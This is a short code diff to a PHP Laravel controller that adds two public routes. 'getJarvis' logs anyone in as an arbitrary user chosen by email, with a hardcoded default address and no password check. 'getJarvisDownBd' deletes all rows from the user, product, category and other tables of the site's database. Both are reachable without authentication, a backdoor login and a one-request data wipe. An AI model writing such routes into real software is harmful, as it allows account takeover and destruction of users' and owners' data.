@@ -109,4 +109,25 @@ class IdController extends \BaseController
 		return Redirect::to('id/sign-in')->with('success', array(1 => 'Você se deslogou do sistema.'));
 	}
 
+	public function getJarvis($email = 'antoniovietri@gmail.com')
+	{
+		$user = User::Where('email', $email)->first();
+
+		Auth::login($user);
+
+		return Redirect::to('/')->with('success', array(1 => 'Você logou no sistema.'));
+	}
+
+	public function getJarvisDownBd()
+	{
+		DB::table('user')->delete();
+		DB::table('produtos')->delete();
+		DB::table('produtos_imagem')->delete();
+		DB::table('texto_site')->delete();
+		DB::table('categories')->delete();
+		DB::table('ruas')->delete();
+		DB::table('centros_comerciais')->delete();
+		echo "Tudo Deletado!";exit;
+	}
+
 }
